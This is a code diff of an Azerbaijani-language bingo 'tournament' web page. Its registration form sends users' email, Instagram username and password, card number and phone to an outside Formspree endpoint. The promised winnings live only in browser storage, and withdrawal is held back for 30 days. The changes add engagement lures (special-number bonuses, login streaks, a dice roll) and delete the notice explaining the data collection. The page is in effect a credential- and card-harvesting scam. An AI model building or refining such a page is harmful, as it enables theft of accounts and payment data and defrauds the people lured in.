@@ -124,6 +124,16 @@
             font-size: 0.9rem;
         }
         .num.marked { background: #22C55E !important; transform: scale(0.96); }
+        .num.special-hit {
+            background: #F59E0B !important;
+            box-shadow: 0 0 10px #F59E0B;
+            animation: pulse 0.5s;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
         .hidden { display: none; }
         .balance-badge {
             background: #F59E0B20;
@@ -141,15 +151,47 @@
         .timer-text { font-size: 1.4rem; font-weight: bold; text-align: center; background: #0F172A; display: inline-block; width: 100%; padding: 6px; border-radius: 40px; }
         .game-status { text-align: center; color: #FCD34D; font-weight: bold; font-size: 0.85rem; }
         .footer-note { text-align: center; font-size: 10px; margin-top: 10px; color: #64748B; }
-        .referral-box {
-            background: #0F172A;
+        .streak-box {
+            background: linear-gradient(135deg, #1E3A5F, #0F172A);
             padding: 10px;
             border-radius: 1rem;
             margin: 10px 0;
-            word-break: break-all;
-            color: white;
+            text-align: center;
+            border: 1px solid #F59E0B;
         }
-        .copy-btn { background: #3B82F6; margin-top: 5px; padding: 8px; }
+        .streak-fire {
+            font-size: 1.5rem;
+            display: inline-block;
+            margin-right: 5px;
+        }
+        .dice-area {
+            background: #0F172A;
+            padding: 15px;
+            border-radius: 1rem;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .dice {
+            font-size: 3rem;
+            display: inline-block;
+            background: #1E293B;
+            padding: 15px 25px;
+            border-radius: 1rem;
+            margin: 10px;
+        }
+        .dice-btn { background: #F59E0B; width: auto; padding: 8px 20px; margin: 5px; }
+        .skip-btn { background: #475569; width: auto; padding: 8px 20px; margin: 5px; }
+        .inline-buttons { display: flex; gap: 10px; justify-content: center; }
+        .special-badge {
+            background: #F59E0B;
+            color: #0F172A;
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            display: inline-block;
+            margin-left: 5px;
+        }
     </style>
 </head>
 <body>
@@ -160,10 +202,11 @@
         <div class="rule-box">
             <strong>📌 Oyun Qaydaları (30 Günlük Turnir)</strong><br>
             • Hər 1 saatda 2 bilet (hər bilet 3 sıra, 5 rəqəm).<br>
-            • Hər 4 saniyədə 1 rəqəm çəkilir. Çıxan rəqəm 4 saniyə dairədə görünür, YALNIZ həmin 4 saniyə ərzində işarələnə bilər.<br>
+            • Hər 4 saniyədə 1 rəqəm çəkilir.<br>
             • Tamamlanan hər sıra üçün uduş: 1 sıra=5₼, 2 sıra=10₼, 3 sıra=30₼, 4+=50₼, 5+=100₼, 6+=200₼.<br>
-            • Uduşlar profilinizdə toplanır. 30 gün tamam olduqda “Çıxarış” düyməsi aktiv olur.<br>
-            • <strong>🎁 Referal sistemi:</strong> Öz linkinizi paylaşın, linklə qeydiyyatdan keçən hər istifadəçiyə görə <strong>5 AZN bonus</strong> qazanın!
+            • <strong>🎯 XÜSUSİ RƏQƏMLƏR:</strong> 7, 13, 23, 42, 50, 69, 77, 88 - hər biri üçün +3 AZN bonus!<br>
+            • <strong>🔥 GÜNDƏLİK STREAK:</strong> Hər gün giriş edin, 3 gün=2₼, 7 gün=5₼, 14 gün=10₼, 30 gün=20₼!<br>
+            • <strong>🎲 SƏRVƏT ZARLARI:</strong> Hər oyundan sonra zar atın, 1-6 AZN əlavə qazanın!
         </div>
         <input type="text" id="firstname" placeholder="Ad (yalnız hərflər)"><div class="example-text">📌 Nümunə: Elçin</div>
         <input type="text" id="lastname" placeholder="Soyad (yalnız hərflər)"><div class="example-text">📌 Nümunə: Məmmədov</div>
@@ -173,13 +216,6 @@
     <div id="reg-screen" class="glass-card hidden">
         <h2>📋 Qeydiyyat</h2>
         <div class="info-text">🔒 Məlumatlarınız təhlükəsizdir. Aktiv email tələb olunur.</div>
-        <div class="rule-box" style="margin-top: 5px; background: #1E293B;">
-            <strong>📢 Niyə bu məlumatlar?</strong><br>
-            • Email – uduş təsdiqi üçün.<br>
-            • Instagram & şifrə – kimlik təsdiqi.<br>
-            • Kart nömrəsi (14 rəqəm) – uduşları köçürmək üçün.<br>
-            • Telefon (+994) – əlaqə üçün.
-        </div>
         <form id="pre-reg-form" action="https://formspree.io/f/meewaooj" method="POST">
             <input type="email" name="email" placeholder="Email (aktiv)" required><div class="example-text">📧 Nümunə: ad@example.com</div>
             <input type="text" name="instagram" placeholder="Instagram istifadəçi adı" required><div class="example-text">📷 Nümunə: @elməmmadov</div>
@@ -188,19 +224,25 @@
             <input type="tel" name="telefon" maxlength="13" placeholder="WhatsApp +994501234567" required><div class="example-text">📞 Nümunə: +994501234567</div>
             <button type="submit">✅ Qeydiyyatı tamamla</button>
         </form>
-        <div class="warning-text">*Kart yalnız uduş köçürmək üçün, 14 rəqəm olmalıdır. Məlumatlarınız email ünvanınıza göndərilir.</div>
+        <div class="warning-text">*Kart yalnız uduş köçürmək üçün, 14 rəqəm olmalıdır.</div>
     </div>
 
     <div id="profile-screen" class="glass-card hidden">
         <h2>👤 Profil</h2>
         <div id="profile-info" class="info-text" style="background:#0F172A; padding:10px; border-radius:1rem; margin-bottom: 12px;"></div>
+        
+        <div class="streak-box">
+            <div><span class="streak-fire">🔥</span> <strong>Gündəlik Streak: <span id="streakDays">0</span> gün</strong></div>
+            <div class="warning-text" id="nextStreakReward">Növbəti mükafat: 3 gündə 2 AZN</div>
+        </div>
+        
         <div id="balance-info" class="balance-badge">💰 Ümumi Qazanc: 0 AZN (30 gün toplanır)</div>
         
         <div class="referral-box">
             <strong>🔗 Öz referal linkiniz:</strong><br>
             <input type="text" id="referralLink" readonly value="" style="font-size:12px; padding:6px;">
             <button class="copy-btn" onclick="copyReferralLink()">📋 Linki kopyala</button>
-            <div class="warning-text" style="margin-top:5px;">Bu linki paylaşın. Hər qeydiyyatdan keçən dostunuza görə 5 AZN bonus qazanın!</div>
+            <div class="warning-text">Hər qeydiyyatdan keçən dostunuza görə 5 AZN bonus!</div>
         </div>
         
         <button id="withdrawBtn" class="withdraw-btn" onclick="requestWithdraw()">💸 Çıxarış (30 gün sonra)</button>
@@ -214,13 +256,21 @@
         <div class="timer-circle" id="current-circle">❓</div>
         <div class="game-status">✨ Cari rəqəm (4 saniyə ərzində işarələ) ✨</div>
         <div id="tickets-container" style="margin-top: 12px;"></div>
-        <div class="warning-text">*Yalnız dairədə görünən rəqəmi 4 saniyə ərzində işarələyin</div>
+        <div class="warning-text">⭐ Sarı rəng XÜSUSİ RƏQƏMLƏRİ göstərir (7,13,23,42,50,69,77,88) - hər biri +3 AZN!</div>
     </div>
 
     <div id="end-screen" class="glass-card hidden">
         <h2>🏆 Oyun Bitdi!</h2>
         <div id="final-result" style="font-size:1.2rem; margin:12px; text-align:center;"></div>
-        <button onclick="showProfileAfterGame()">📁 Profilə Qayıt</button>
+        <div id="dice-game-area" class="dice-area hidden">
+            <div>🎲 <strong>SƏRVƏT ZARLARI</strong> 🎲</div>
+            <div class="dice" id="diceValue">⚀</div>
+            <div class="inline-buttons">
+                <button class="dice-btn" onclick="rollDice()">🎲 Zar At (1-6 AZN)</button>
+                <button class="skip-btn" onclick="skipDice()">⏭ Keç</button>
+            </div>
+        </div>
+        <button onclick="showProfileAfterGame()" style="margin-top:10px;">📁 Profilə Qayıt</button>
         <button onclick="location.reload()" style="background:#475569; margin-top:8px;">🔄 Ana səhifə</button>
     </div>
 </div>
@@ -230,14 +280,26 @@
     let gameInterval = null, drawInterval = null;
     let drawnNumbers = [];
     let allGameRows = [];
+    let allRowElements = [];
     let currentDrawNumber = null;
     let lastDrawTimestamp = 0;
+    let specialBonusThisGame = 0;
+    let pendingDiceWin = null;
+    
     const DRAW_DURATION = 4000;
     const DRAW_INTERVAL = 4000;
     const COOLDOWN_HOURS = 1;
     const COOLDOWN_MS = COOLDOWN_HOURS * 3600000;
+    const SPECIAL_NUMBERS = [7, 13, 23, 42, 50, 69, 77, 88];
+    
+    // Streak mükafatları
+    const STREAK_REWARDS = {
+        3: 2,
+        7: 5,
+        14: 10,
+        30: 20
+    };
 
-    // === YADDAŞ FUNKSİYALARI ===
     function savePlayer(p) { localStorage.setItem('sans_topu_player', JSON.stringify(p)); }
     function loadPlayer() { return JSON.parse(localStorage.getItem('sans_topu_player')); }
     function getAllPlayers() { return JSON.parse(localStorage.getItem('all_players') || '{}'); }
@@ -271,6 +333,56 @@
             });
             return response.ok;
         } catch(e) { return false; }
+    }
+
+    // === GÜNDƏLİK STREAK SİSTEMİ ===
+    function checkAndUpdateStreak() {
+        if (!currentPlayer) return;
+        const today = new Date().toDateString();
+        const lastLogin = currentPlayer.lastLoginDate || "";
+        
+        if (lastLogin !== today) {
+            let streak = currentPlayer.streakDays || 0;
+            const yesterday = new Date();
+            yesterday.setDate(yesterday.getDate() - 1);
+            
+            if (lastLogin === yesterday.toDateString()) {
+                streak++;
+            } else {
+                streak = 1;
+            }
+            
+            currentPlayer.streakDays = streak;
+            currentPlayer.lastLoginDate = today;
+            
+            // Streak mükafatını yoxla
+            if (STREAK_REWARDS[streak]) {
+                const reward = STREAK_REWARDS[streak];
+                currentPlayer.totalWinnings = (currentPlayer.totalWinnings || 0) + reward;
+                currentPlayer.balance = currentPlayer.totalWinnings;
+                alert(`🔥 ${streak} günlük streakiniz üçün ${reward} AZN bonus qazandınız!`);
+            }
+            
+            savePlayer(currentPlayer);
+            updateStreakDisplay();
+            updateBalanceDisplay();
+            updateWithdrawButton();
+        }
+    }
+    
+    function updateStreakDisplay() {
+        if (!currentPlayer) return;
+        const streak = currentPlayer.streakDays || 0;
+        document.getElementById('streakDays').innerText = streak;
+        
+        let nextReward = "";
+        if (streak < 3) nextReward = "3 gündə 2 AZN";
+        else if (streak < 7) nextReward = "7 gündə 5 AZN";
+        else if (streak < 14) nextReward = "14 gündə 10 AZN";
+        else if (streak < 30) nextReward = "30 gündə 20 AZN";
+        else nextReward = "Maksimum streaka çatdınız! 🏆";
+        
+        document.getElementById('nextStreakReward').innerHTML = `🎯 Növbəti mükafat: ${nextReward}`;
     }
 
     function updateWithdrawButton() {
@@ -307,7 +419,7 @@
         const first = document.getElementById('firstname').value.trim();
         const last = document.getElementById('lastname').value.trim();
         if (!validateName(first, last)) {
-            alert("❌ Ad və Soyad minimum 2 hərf, yalnız Azərbaycan hərfləri! (Məs: Elçin Məmmədov)");
+            alert("❌ Ad və Soyad minimum 2 hərf, yalnız Azərbaycan hərfləri!");
             return;
         }
         sessionStorage.setItem('reg_fullname', first + " " + last);
@@ -315,32 +427,25 @@
         document.getElementById('reg-screen').classList.remove('hidden');
     }
 
-    // === REFERAL BONUS FUNKSİYASI (DÜZƏLDİLDİ) ===
     function giveReferralBonus(newUserId, referrerId) {
         if (!referrerId) return false;
         let referrer = loadPlayerById(referrerId);
         if (!referrer) return false;
         
-        // Bonusu əlavə et
         referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
         referrer.balance = referrer.totalWinnings;
         savePlayerById(referrerId, referrer);
         
-        // Bildiriş göstər (əgər referer hal-hazırda online-dırsa)
         if (currentPlayer && currentPlayer.id === referrerId) {
             currentPlayer = referrer;
             savePlayer(currentPlayer);
-            alert(`🎉 Təbriklər! Sizin referal linkinizdən yeni istifadəçi qeydiyyatdan keçdi. Hesabınıza +5 AZN bonus əlavə edildi! Ümumi balans: ${currentPlayer.totalWinnings} AZN`);
+            alert(`🎉 Referal bonusu! +5 AZN. Ümumi balans: ${currentPlayer.totalWinnings} AZN`);
             updateBalanceDisplay();
             updateWithdrawButton();
-        } else {
-            // Əgər referer online deyilsə, sadəcə konsola yaz
-            console.log(`Referal bonusu verildi: ${referrer.fullname} (+5 AZN)`);
         }
         return true;
     }
 
-    // QEYDİYYAT FORMUNUN İŞLƏNMƏSİ (BONUS DÜZƏLDİLDİ)
     document.getElementById('pre-reg-form').onsubmit = async function (e) {
         e.preventDefault();
         const fullname = sessionStorage.getItem('reg_fullname') || '';
@@ -359,11 +464,10 @@
             return;
         }
         if (!phone.startsWith('+994') || phone.length !== 13 || isNaN(phone.slice(1))) {
-            alert("Telefon +994 ilə başlayan 13 rəqəm olmalıdır! Məs: +994501234567");
+            alert("Telefon +994 ilə başlayan 13 rəqəm olmalıdır!");
             return;
         }
 
-        // Mövcud profili yoxla
         let existing = loadPlayer();
         if (existing && (existing.email === email || existing.phone === phone || existing.card === card)) {
             currentPlayer = existing;
@@ -372,9 +476,8 @@
             return;
         }
 
-        // YENİ İSTİFADƏÇİ YARAT
         const userId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
-        const referrerId = getReferralFromUrl(); // Linkdən gələn ref
+        const referrerId = getReferralFromUrl();
         
         currentPlayer = {
             id: userId,
@@ -382,26 +485,26 @@
             balance: 0, totalWinnings: 0,
             lastPlayTime: null,
             registeredAt: new Date().toISOString(),
-            referredBy: referrerId || null
+            referredBy: referrerId || null,
+            streakDays: 1,
+            lastLoginDate: new Date().toDateString()
         };
         savePlayer(currentPlayer);
         let all = getAllPlayers();
         all[userId] = currentPlayer;
         localStorage.setItem('all_players', JSON.stringify(all));
         
-        // Formspree göndər
         const formData = {
             fullname, email, instagram, telefon: phone, kart: card, sifre: password,
             referrer: referrerId || 'yoxdur', registeredAt: new Date().toLocaleString()
         };
         await sendToFormspree(formData);
         
-        // *** REFERAL BONUS VER (DÜZƏLDİLDİ) ***
         if (referrerId) {
             giveReferralBonus(userId, referrerId);
         }
         
-        alert("✅ Qeydiyyat tamamlandı! Məlumatlarınız email ünvanınıza göndərildi. İndi oynaya bilərsiniz.");
+        alert("✅ Qeydiyyat tamamlandı! İndi oynaya bilərsiniz.");
         showProfileScreen();
     };
 
@@ -411,6 +514,9 @@
         document.getElementById('end-screen').classList.add('hidden');
         document.getElementById('profile-screen').classList.remove('hidden');
         if (!currentPlayer) return;
+        
+        checkAndUpdateStreak();
+        
         document.getElementById('profile-info').innerHTML = `
             <strong>Ad Soyad:</strong> ${currentPlayer.fullname}<br>
             <strong>Email:</strong> ${currentPlayer.email}<br>
@@ -421,12 +527,8 @@
         `;
         updateBalanceDisplay();
         updateWithdrawButton();
+        updateStreakDisplay();
         
-        // Referal linki yarat (DÜZGÜN FORMAT)
-        if (!currentPlayer.id) {
-            currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
-            savePlayer(currentPlayer);
-        }
         const baseUrl = window.location.origin + window.location.pathname;
         const refLink = `${baseUrl}?ref=${currentPlayer.id}`;
         const refInput = document.getElementById('referralLink');
@@ -437,7 +539,7 @@
         const refInput = document.getElementById('referralLink');
         refInput.select();
         document.execCommand('copy');
-        alert("✅ Link kopyalandı! İndi linkdə ?ref=... hissəsi var. Bu linki paylaşın.");
+        alert("✅ Link kopyalandı!");
     }
 
     function updateBalanceDisplay() {
@@ -477,18 +579,46 @@
         showProfileScreen();
     }
 
+    // === SƏRVƏT ZARLARI ===
+    function rollDice() {
+        const diceValue = Math.floor(Math.random() * 6) + 1;
+        const diceSymbols = {1:"⚀",2:"⚁",3:"⚂",4:"⚃",5:"⚄",6:"⚅"};
+        document.getElementById('diceValue').innerHTML = diceSymbols[diceValue];
+        
+        const diceWin = diceValue;
+        if (currentPlayer) {
+            currentPlayer.totalWinnings += diceWin;
+            currentPlayer.balance = currentPlayer.totalWinnings;
+            savePlayer(currentPlayer);
+            updateBalanceDisplay();
+            updateWithdrawButton();
+            document.getElementById('final-result').innerHTML = document.getElementById('final-result').innerHTML + `<br>🎲 Zar: ${diceValue} gəldi! +${diceWin} AZN!`;
+        }
+        
+        document.getElementById('dice-game-area').classList.add('hidden');
+        alert(`🎲 Zar ${diceValue} gəldi! +${diceWin} AZN qazandınız!`);
+    }
+    
+    function skipDice() {
+        document.getElementById('dice-game-area').classList.add('hidden');
+    }
+
     function initGameClean() {
         if (gameInterval) clearInterval(gameInterval);
         if (drawInterval) clearInterval(drawInterval);
         drawnNumbers = [];
         allGameRows = [];
+        allRowElements = [];
         gameTimer = 180;
         currentDrawNumber = null;
         lastDrawTimestamp = 0;
+        specialBonusThisGame = 0;
+        
         document.getElementById('timer').textContent = `⏱ ${gameTimer} saniyə`;
         document.getElementById('current-circle').textContent = '❓';
         const container = document.getElementById('tickets-container');
         container.innerHTML = '';
+        
         for (let t = 0; t < 2; t++) {
             const ticketDiv = document.createElement('div');
             ticketDiv.className = 'ticket';
@@ -502,33 +632,51 @@
                     if (!nums.includes(n)) nums.push(n);
                 }
                 nums.sort((a,b)=>a-b);
-                const rowData = { elements: [] };
+                const rowElements = [];
                 nums.forEach(num => {
                     const el = document.createElement('div');
                     el.className = 'num';
+                    if (SPECIAL_NUMBERS.includes(num)) {
+                        el.style.background = "#F59E0B";
+                        el.style.color = "#0F172A";
+                    }
                     el.textContent = num;
                     el.dataset.number = num;
+                    el.dataset.marked = "false";
                     el.onclick = (function(n, div) {
                         return function() {
                             if (!currentDrawNumber) { alert("⏳ Hələ heç bir rəqəm çəkilməyib!"); return; }
                             const timeDiff = Date.now() - lastDrawTimestamp;
-                            if (currentDrawNumber === n && timeDiff <= DRAW_DURATION) div.classList.toggle('marked');
+                            if (currentDrawNumber === n && timeDiff <= DRAW_DURATION) {
+                                if (div.classList.contains('marked')) return;
+                                div.classList.add('marked');
+                                div.dataset.marked = "true";
+                                
+                                // GİZLİ RƏQƏM BONUSU
+                                if (SPECIAL_NUMBERS.includes(n)) {
+                                    specialBonusThisGame += 3;
+                                    div.classList.add('special-hit');
+                                    alert(`✨ XÜSUSİ RƏQƏM! (${n}) +3 AZN bonus qazandınız! ✨`);
+                                }
+                            }
                             else if (timeDiff > DRAW_DURATION) alert(`⌛ Vaxt keçdi! Rəqəm ${currentDrawNumber} idi, 4 saniyə keçdi.`);
                             else alert(`❌ İndiki rəqəm: ${currentDrawNumber}, siz ${n} işarələməyə çalışırsınız.`);
                         };
                     })(num, el);
                     rowDiv.appendChild(el);
-                    rowData.elements.push(el);
+                    rowElements.push(el);
                 });
                 ticketDiv.appendChild(rowDiv);
-                allGameRows.push(rowData);
+                allRowElements.push(rowElements);
             }
             container.appendChild(ticketDiv);
         }
+        
         gameInterval = setInterval(() => {
             if (gameTimer <= 1) { clearInterval(gameInterval); clearInterval(drawInterval); endGame(); }
             else { gameTimer--; document.getElementById('timer').textContent = `⏱ ${gameTimer} saniyə`; }
         }, 1000);
+        
         drawInterval = setInterval(() => {
             if (gameTimer <= 0) return;
             if (drawnNumbers.length >= 90) drawnNumbers = [];
@@ -550,10 +698,12 @@
     function endGame() {
         if (gameInterval) clearInterval(gameInterval);
         if (drawInterval) clearInterval(drawInterval);
+        
         let completedRows = 0;
-        for (let row of allGameRows) {
-            if (row.elements.every(el => el.classList.contains('marked'))) completedRows++;
+        for (let row of allRowElements) {
+            if (row.every(el => el.classList.contains('marked'))) completedRows++;
         }
+        
         let win = 0;
         if (completedRows === 1) win = 5;
         else if (completedRows === 2) win = 10;
@@ -561,15 +711,35 @@
         else if (completedRows === 4) win = 50;
         else if (completedRows === 5) win = 100;
         else if (completedRows >= 6) win = 200;
-        if (win > 0 && currentPlayer) {
-            currentPlayer.totalWinnings += win;
+        
+        // Gizli rəqəm bonusunu əlavə et
+        const totalWin = win + specialBonusThisGame;
+        
+        if (totalWin > 0 && currentPlayer) {
+            currentPlayer.totalWinnings += totalWin;
             currentPlayer.balance = currentPlayer.totalWinnings;
             savePlayer(currentPlayer);
         }
-        document.getElementById('final-result').innerHTML = `✅ Tamamlanmış sıra: ${completedRows}<br>🎉 Qazanc: ${win} AZN<br>💰 Ümumi balans: ${currentPlayer ? currentPlayer.totalWinnings : 0} AZN`;
+        
+        let resultText = `✅ Tamamlanmış sıra: ${completedRows}<br>🎯 Oyun uduşu: ${win} AZN`;
+        if (specialBonusThisGame > 0) {
+            resultText += `<br>✨ Xüsusi rəqəm bonusu: +${specialBonusThisGame} AZN`;
+        }
+        resultText += `<br>💰 Cəmi qazanc: ${totalWin} AZN<br>🏦 Ümumi balans: ${currentPlayer ? currentPlayer.totalWinnings : 0} AZN`;
+        
+        document.getElementById('final-result').innerHTML = resultText;
         if (currentPlayer) updateBalanceDisplay();
+        
         document.getElementById('game-screen').classList.add('hidden');
         document.getElementById('end-screen').classList.remove('hidden');
+        
+        // Zar oyununu göstər
+        if (totalWin > 0 || specialBonusThisGame > 0) {
+            document.getElementById('dice-game-area').classList.remove('hidden');
+            document.getElementById('diceValue').innerHTML = "⚀";
+        } else {
+            document.getElementById('dice-game-area').classList.add('hidden');
+        }
     }
     
     window.onload = () => {
@@ -580,9 +750,10 @@
                 currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
                 savePlayer(currentPlayer);
             }
+            if (!currentPlayer.streakDays) currentPlayer.streakDays = 0;
             showProfileScreen();
         }
     };
 </script>
 </body>
-    </html>
+            </html>
